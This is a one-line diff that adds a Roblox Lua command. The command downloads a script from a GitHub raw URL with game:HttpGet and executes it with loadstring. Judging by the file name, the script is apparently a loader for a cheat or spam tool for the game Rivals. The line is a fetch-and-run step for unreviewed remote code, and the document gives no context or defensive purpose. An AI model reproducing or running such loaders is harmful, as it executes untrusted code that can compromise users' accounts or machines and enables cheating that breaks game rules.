@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/rivals-spam0-y7qedltmdx7ia1.lua"))()
